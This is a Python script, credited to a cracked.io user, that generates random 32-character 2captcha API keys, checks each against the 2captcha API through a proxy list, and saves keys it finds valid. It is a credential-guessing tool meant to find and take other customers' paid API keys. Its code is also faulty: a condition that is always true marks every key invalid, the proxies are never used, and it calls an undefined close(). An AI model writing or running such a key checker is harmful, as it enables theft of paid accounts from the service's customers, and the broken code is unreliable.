import requests
import random
import string
import time
from subprocess import check_output
import os
os.popen('pip install pysocks')
def gen(length):
    letters_and_digits = string.ascii_letters + string.digits
    result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))
    return result_str
def check(key,proxy):
  url = f'http://2captcha.com/res.php?key={key}&action=get2&id=2122988149&json=1'
  r = requests.get(url)
  if "ERROR_KEY_DOES_NOT_EXIST" or "IP" in r.text:
    status = 'invalid'
  elif "price" in r.text:
    status = 'valid'
  else:
    status = r.text
  return status
def proxy_loader(proxyfile,proxytype):
  lines = open(proxyfile).read().splitlines()
  proxy =random.choice(lines)
  if proxytype == '1':
    proxies = {"http": proxy}
  elif proxytype == '2':
    proxies = {'http': "socks5://"+proxy}
  elif proxytype == '3':
    proxies = {'http': "socks5://"+proxy}
  else:
    print('Goodbye')
    time.sleep(5)
    close()
  return proxies
print('2captcha key gen and checker by cracked.io/lamlucius8')
amount = input('How many keys to gen and check : ')
amount = (int(amount))
print('Which type proxy ?\n1 : http\n2 : socks4\n3 : socks5\n')
proxytype2 = input('Your Choice : ')
proxyfile2 = input('Proxy File : ')
for x in range(amount):
  proxys = proxy_loader(proxyfile2,proxytype2)
  key = gen(32)
  output = check(key,proxys)
  if output == 'invalid':
    print(f'invalid : {key}')
  if output == 'valid':
    print(f'valid : {key}')
    f = open('valid.txt','a+')
    f.write(f'{key}\n')
print('Done')
time.sleep(15)





  
